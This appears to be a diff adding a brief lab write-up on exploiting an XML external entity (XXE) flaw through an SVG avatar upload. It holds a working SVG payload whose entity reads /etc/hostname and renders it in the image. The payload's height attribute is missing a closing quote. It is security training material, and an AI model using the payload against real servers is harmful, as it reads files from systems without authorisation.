@@ -1,0 +1,18 @@
+Exploiting XXE via image file upload
+
+In this lab its possible to upload svg in the avarar upload section of the comments. since svgs have xml contents the parser in the server 
+might be XXE vulnerable. So download one svg and open it, mine looked like this
+
+
+<!--?xml version="1.0" encoding="UTF-8"?-->
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+
+]>
+<svg standalone="yes" xmlns="http://www.w3.org/2000/svg" width="100" height="10>
+  <circle cx="50" cy="50" r="40" fill="red"></circle>
+  <text font-size="12" x="0" y="16">&xxe;</text>
+</svg>
+
+but I added the doctype, entity and the text 
+it now displays the contents of the hostname on the image
